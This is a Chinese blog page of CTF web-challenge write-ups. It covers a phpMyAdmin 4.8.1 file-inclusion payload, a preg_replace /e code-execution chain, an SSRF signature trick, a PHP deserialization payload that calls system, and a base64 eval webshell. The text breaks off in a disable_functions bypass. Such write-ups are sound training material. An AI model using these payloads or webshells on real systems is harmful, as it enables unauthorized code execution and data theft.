2019]我有一个数据库</h1><p>页面是乱码，想知道内容了可以看下图</p>\n<p>$$各种乱码图</p>\n<p>对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存–&gt;GBK，再通过编码打开–&gt;UTF-8。内容如下</p>\n<blockquote>\n<p>我有一个数据库，但里面什么也没有~<br>不信你找</p>\n</blockquote>\n<p>提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞</p>\n<p><a href=\"https://www.secpulse.com/archives/72817.html\">phpmyadmin4.8.1后台getshell</a></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag</span><br></pre></td></tr></table></figure>\n\n<p>可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称</p>\n<hr>\n<h1 id=\"2021-03-01\"><a href=\"#2021-03-01\" class=\"headerlink\" title=\"2021.03.01\"></a>2021.03.01</h1><hr>\n<h1 id=\"BJDCTF2020-ZJCTF，不过如此\"><a href=\"#BJDCTF2020-ZJCTF，不过如此\" class=\"headerlink\" title=\"[BJDCTF2020]ZJCTF，不过如此\"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>绕过</p>\n<p>第一层用php伪协议中的data封装流。<a href=\"https://segmentfault.com/a/1190000018991087\">PHP伪协议总结</a></p>\n<p>然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>\n\n<p>读出来的next.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure>\n\n<p>base64解码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class=\"line\"></span><br><span class=\"line\">function complex($re, $str) &#123;</span><br><span class=\"line\">    return preg_replace(</span><br><span class=\"line\">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class=\"line\">        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,</span><br><span class=\"line\">        $str</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class=\"line\">    echo complex($re, $str). &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag()&#123;</span><br><span class=\"line\">\t@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里想要通过需要知道一个<a href=\"http://www.xinyueseo.com/websecurity/158.html\">深入研究 preg_replace /e 模式下的代码漏洞问题</a></p>\n<p>最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h1><p>进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">&#x27;latin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, action, param, sign, ip</span>):</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):  <span class=\"comment\"># SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;scan&quot;</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">                resp = scan(self.param)  <span class=\"comment\"># 此处是文件读取得注入点</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">&quot;Connection Timeout&quot;</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">&#x27;data&#x27;</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;read&quot;</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">&#x27;data&#x27;</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">&#x27;code&#x27;</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">&#x27;data&#x27;</span>] = <span class=\"string\">&quot;Action Error&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">&#x27;code&#x27;</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">&#x27;msg&#x27;</span>] = <span class=\"string\">&quot;Sign Error&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/geneSign&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span>():</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">&quot;param&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">    action = <span class=\"string\">&quot;scan&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/De1ta&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span>():</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">&quot;action&quot;</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">&quot;param&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">&quot;sign&quot;</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;No Hacker!!!!&quot;</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;code.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span>(<span class=\"params\">param</span>):</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Connection Timeout&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span>(<span class=\"params\">action, param</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span>(<span class=\"params\">content</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span>(<span class=\"params\">param</span>):</span></span><br><span class=\"line\">    check = param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">&quot;gopher&quot;</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">&quot;file&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>简单说明思路：</p>\n<p>请求部分(代码69-78)：</p>\n<table>\n<thead>\n<tr>\n<th>获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>读取文件需要在cookie里传入参数action、sign</td>\n</tr>\n<tr>\n<td>action是执行类型，代码33行和43行指出了两种。</td>\n</tr>\n<tr>\n<td>sing是用来验证param和action的，相关函数在94行，稍后做解释</td>\n</tr>\n</tbody></table>\n<p>获取sign部分(61-66)</p>\n<table>\n<thead>\n<tr>\n<th>获取param，action固定为scan</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>返回(secert_key + param + action)组合的sign</td>\n</tr>\n</tbody></table>\n<p>所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。</p>\n<p>假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用<code>|</code>仅为说明使用，其实字符串是相连的)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txt|scan</span><br></pre></td></tr></table></figure>\n\n<p>但是我们想要使用read，可以构造param为flag.txtread</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txtread|scan</span><br></pre></td></tr></table></figure>\n\n<p>再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secert_key|flag.txt|readscan</span><br></pre></td></tr></table></figure>\n\n<p>请求/geneSign</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/geneSign?param=flag.txtread</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9017a8826b7267833f22c0f22d90fea7</span><br></pre></td></tr></table></figure>\n\n<p>得到sign以后，再去访问/De1ta</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta?param=flag.txt</span><br><span class=\"line\"></span><br><span class=\"line\">sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<hr>\n<h1 id=\"网鼎杯-2020-朱雀组-phpweb\"><a href=\"#网鼎杯-2020-朱雀组-phpweb\" class=\"headerlink\" title=\"[网鼎杯 2020 朱雀组]phpweb\"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>看源码，有一个表单和自动提交的js。表单参数为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func=date&amp;p=Y-m-d+h%3Ai%3As+a</span><br></pre></td></tr></table></figure>\n\n<p>是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class=\"line\">    function gettime($func, $p) &#123;</span><br><span class=\"line\">        $result = call_user_func($func, $p);</span><br><span class=\"line\">        $a= gettype($result);</span><br><span class=\"line\">        if ($a == &quot;string&quot;) &#123;</span><br><span class=\"line\">            return $result;</span><br><span class=\"line\">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    class Test &#123;</span><br><span class=\"line\">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class=\"line\">        var $func = &quot;date&quot;;</span><br><span class=\"line\">        function __destruct() &#123;</span><br><span class=\"line\">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class=\"line\">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class=\"line\">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if ($func != null) &#123;</span><br><span class=\"line\">        $func = strtolower($func);</span><br><span class=\"line\">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class=\"line\">            echo gettime($func, $p);</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            die(&quot;Hacker...&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。</p>\n<p>先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class Test &#123;</span><br><span class=\"line\">        var $p = &quot;ls ../../../../&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        var $func = &quot;system&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">$s=new Test();</span><br><span class=\"line\">echo urlencode(serialize($s));</span><br><span class=\"line\">#unserialize</span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>\n\n<p>wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">func=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></pre></td></tr></table></figure>\n\n<p>最后读文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func=readfile&amp;p=../../../../tmp/flagoefiu4r93</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"GKCTF2020-CheckIN\"><a href=\"#GKCTF2020-CheckIN\" class=\"headerlink\" title=\"[GKCTF2020]CheckIN\"></a>[GKCTF2020]CheckIN</h1><p>是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phpinfo();</span><br><span class=\"line\">cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>\n\n<p>查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数</p>\n<p>可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。</p>\n<p>scandir根目录查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7</span><br></pre></td></tr></table></figure>\n\n<p>又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件</p>\n<p>传码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval($_POST[1]);</span><br><span class=\"line\">ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>\n\n<p>蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道<a href=\"https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/\">RCE ME</a>也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 